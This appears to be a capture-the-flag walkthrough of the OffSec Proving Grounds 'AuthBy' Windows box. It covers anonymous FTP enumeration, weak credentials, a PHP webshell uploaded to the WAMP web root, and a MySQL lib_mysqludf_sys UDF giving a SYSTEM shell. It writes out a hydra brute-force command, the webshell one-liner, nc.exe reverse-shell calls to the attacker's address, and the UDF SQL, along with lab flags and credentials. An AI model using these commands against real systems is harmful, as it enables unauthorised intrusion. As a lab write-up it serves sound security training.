---
title: "AuthBy (OffSec PG) — Walkthrough: Anonymous FTP → WAMP Web Root → MySQL UDF SYSTEM"
description: "OffSec Proving Grounds AuthBy walkthrough — anonymous FTP leaks usernames, weak service creds land HTTP Basic and an FTP account whose home is the WAMP web root, then a passwordless LocalSystem MySQL and lib_mysqludf_sys give SYSTEM."
date: 2026-09-21 09:00:00 +0000
categories: [CTF]
tags: [ctf, offsec, proving-grounds, windows, ftp, wamp, mysql-udf, privilege-escalation]
difficulty: Easy
---

> **Box:** OffSec Proving Grounds — AuthBy · **OS:** Windows (WAMP, Server 2008 SP1) · **Theme:** anonymous FTP → weak creds → web root write → MySQL UDF SYSTEM

AuthBy is an old-school Windows box running the WAMP stack. Anonymous FTP leaks valid usernames, weak service-specific creds get you into the web app and an FTP account whose home *is* the web root, and the finish is the classic passwordless `wampmysqld` running as LocalSystem plus a `lib_mysqludf_sys` UDF for a SYSTEM shell.

- **Box:** `192.168.200.46` (LIVDA)
- **Me (tun0):** `192.168.45.249`

---

## Recon

Started with my recon wrapper to sweep the full port range and hand the open ports off for service detection:

```text
┌──(kali㉿kali)-[~/Desktop/Tools/reconx]
└─$ python3 reconx.py 192.168.200.46

[00:44:44] [+] 192.168.200.46: 4 open port(s): 21, 242, 3145, 3389
[00:44:49] [MEDIUM]   rdp:3389  RDP NTLM info leaks: LIVDA
[00:44:50] [CRITICAL] ftp:21    Anonymous FTP login allowed
[00:44:51] [CRITICAL] ftp:21    Anonymous FTP login allowed (directory listed)
[00:45:10] [MEDIUM]   exploit:21   zFTPServer Suite 6.0.0.52 - 'rmdir' Directory Traversal
[00:45:12] [MEDIUM]   exploit:242  Apache 2.2.21 / PHP < 5.3.12 - cgi-bin RCE (+17 more)

  OPEN TCP PORTS
    21     ftp              zFTPServer 6.0 build 2011-10-17
    242    http             Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
    3145   zftp-admin       zFTPServer admin
    3389   ms-wbt-server    Microsoft Terminal Service
```

| Port | Service | Version |
|---|---|---|
| 21 | ftp | zFTPServer 6.0 build 2011-10-17 — **anonymous login allowed** |
| 242 | http | Apache 2.2.21 (Win32) PHP/5.3.8 — **401 HTTP Basic**, realm `Qui e nuce nuculeum esse volt, frangit nucem!` |
| 3145 | zftp-admin | zFTPServer admin interface |
| 3389 | ms-wbt-server | RDP, TLS cert CN=**LIVDA** |

That realm is Latin — *"he who wants to eat the kernel must crack the nut"* — a not-so-subtle nudge to crack credentials.

**Attack plan:** anonymous FTP exposes an `accounts/` directory (zFTPServer `.uac` account files). Pull them, recover the admin password, reuse against HTTP Basic on :242 and/or RDP.

---

## Enumeration

### FTP (21) — anonymous

Anonymous login works (`230 User logged in`). The server root holds the zFTPServer install (`zFTPServer.exe`, `Settings.ini`, `accounts/`, `log/`):

```text
┌──(kali㉿kali)-[~/Desktop/Tools/reconx]
└─$ ftp 192.168.200.46
Connected to 192.168.200.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.200.46:kali): anonymous
331 User name received, need password.
Password:
230 User logged in, proceed.
ftp> ls
150 Opening connection for /bin/ls.
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Aug 24 03:23 log
dr-xr-xr-x   1 root     root          512 Jul 17 02:52 accounts
226 Closing data connection.
```

`accounts/` and `accounts/backup/` list three account files, leaking **valid usernames**:

```text
acc[admin].uac
acc[Offsec].uac
acc[anonymous].uac
```

**Key finding:** anonymous is **LIST-only**. Every `RETR` (download) returns `550 Access denied` — confirmed on `Settings.ini`, `LICENSE.htm`, and all `acc[*].uac` (tested via `ftp`, `curl`, and a wildcard `mget` to rule out the `[ ]` glob issue). `STOR` (upload) is denied everywhere too. So the usual "download `acc[admin].uac` and read the password" route is closed on this instance — the box wants the password **cracked** (matching the Latin realm hint).

### zFTP admin (3145)

A second FTP-style service (`220 .` banner) — the zFTPServer administration interface.

### Web (242) — HTTP Basic auth

Every path returns `401`. Common creds (`admin:admin`, `admin:password`, `Offsec:Offsec`, …) all bounce. Confirmed the **entire** docroot is behind the 401 (`index.php`, `phpinfo.php`, `robots.txt`, `/admin/`, `server-status` — all 401), so the credential is the only way in.

Re-verified the FTP read-denial is real and not a passive-mode artifact by forcing **active mode** (EPRT) — still `550 Access denied`. Set up a focused Basic-auth crack on `admin`:

```bash
hydra -l admin -P rockyou.txt -s 242 -f -t 32 192.168.200.46 http-get /
```

**Resolution (no rockyou hit needed):** the creds on this box are weak and *service-specific*. Verified against this instance:

| Service | Credentials | Result |
|---|---|---|
| **Web 242** (HTTP Basic) | `offsec:elite` | **200 OK** |
| **FTP 21** (admin account) | `admin:admin` | login OK |

`admin:admin` on FTP does **not** land in the install dir — admin's FTP home **is the web root** (`C:\wamp\www`), giving write access to the docroot. (`admin:admin` on the 3145 admin interface is rejected — different password.)

---

## Foothold — RCE as livda\apache

admin's FTP home = `C:\wamp\www` (the WAMP docroot, per the `.htaccess` `AuthUserFile c:\wamp\www\.htpasswd`). Uploaded a PHP webshell via FTP and executed it through the authenticated web server:

```bash
# upload (FTP as admin:admin)
echo '<?php system($_REQUEST["cmd"]); ?>' > s.php   # put s.php -> C:\wamp\www\s.php

# execute (web, authenticated)
curl -u offsec:elite 'http://192.168.200.46:242/s.php' --data-urlencode 'cmd=whoami'
# -> livda\apache   (Windows Server 2008 SP1, 6.0.6001, x86)
```

Stabilised with an `nc.exe` reverse shell (uploaded via FTP) once the callback path was fixed — see the note below.

**local.txt** (`C:\Users\apache\Desktop\local.txt`) = `2225cb6a0f5203c7c2d43a5e97a35b95`

> ⚠️ **Callback gotcha:** the reverse shells first failed — not because of target egress, but because the **attacker host's own iptables** REJECTed all inbound except SSH. Fix: `sudo iptables -I INPUT -p tcp --dport <port> -j ACCEPT`. Also note Apache runs in **session 0**, so GUI-subsystem kernel exploits (MS15-051) silently no-op here.

---

## Privilege Escalation — SYSTEM via MySQL UDF

`whoami /priv` shows **SeImpersonatePrivilege** enabled, but Churrasco failed (it needs a NETWORK SERVICE token; apache runs as its own user) and MS10-059 / MS15-051 didn't take either. The clean win is the WAMP stack itself: **`wampmysqld` runs as LocalSystem** and `root@localhost` has **no password**.

First, a direct flag read — MySQL (as SYSTEM) can read the Administrator desktop:

```sql
mysql -u root -e "select load_file('C:/Users/Administrator/Desktop/proof.txt')"
-- e7064ba79083e57c6c46240d2baf78d3
```

Then a full SYSTEM shell via the `lib_mysqludf_sys` UDF (`secure_file_priv = NULL`, plugin dir writable):

```sql
-- DLL uploaded to the webroot via FTP, then copied into the plugin dir:
select load_file('C:/wamp/www/sys32.dll')
  into dumpfile 'c:/wamp/bin/mysql/mysql5.5.16/lib/plugin/lib_mysqludf_sys.dll';

create function sys_exec returns int    soname 'lib_mysqludf_sys.dll';
create function sys_eval returns string soname 'lib_mysqludf_sys.dll';

select sys_eval('whoami');                       -- nt authority\system
select sys_exec('C:\wamp\www\nc.exe 192.168.45.249 4445 -e cmd.exe');  -- SYSTEM shell
```

Result: `nt authority\system` on LIVDA.

**proof.txt** = `e7064ba79083e57c6c46240d2baf78d3`

---

## Loot / Credentials

- Web Basic auth: `offsec:elite` (hash `offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0`)
- FTP admin account: `admin:admin` (home = `C:\wamp\www`)
- MySQL: `root` / *(no password)* — service account runs as **LocalSystem**
- Flags: local `2225cb6a0f5203c7c2d43a5e97a35b95` · proof `e7064ba79083e57c6c46240d2baf78d3`

---

## Kill chain (summary)

anon FTP (usernames leak) → `offsec:elite` cracks web / `admin:admin` FTP → admin FTP home = webroot → upload PHP shell → RCE as apache → WAMP MySQL as LocalSystem + passwordless root → `lib_mysqludf_sys` UDF → **SYSTEM**.

## Takeaways

- **Anonymous FTP that's LIST-only still helps you** — even without downloads, the `accounts/` filenames leaked every valid username and told me exactly which creds to target.
- **Read the hints.** The Latin 401 realm was a literal instruction to crack credentials rather than chase a file-read.
- **A service's home directory is attack surface.** An FTP account rooted at `C:\wamp\www` turns "FTP login" into "write to the web root," which turns straight into RCE.
- **When token-impersonation privesc stalls, look at what else runs as SYSTEM.** A default WAMP `wampmysqld` as LocalSystem with a passwordless root is a reliable path to SYSTEM via `lib_mysqludf_sys` — no kernel exploit required.
- **Watch your own box.** The reverse shell "target egress" problem was actually local iptables. Rule out your own host before blaming the target.
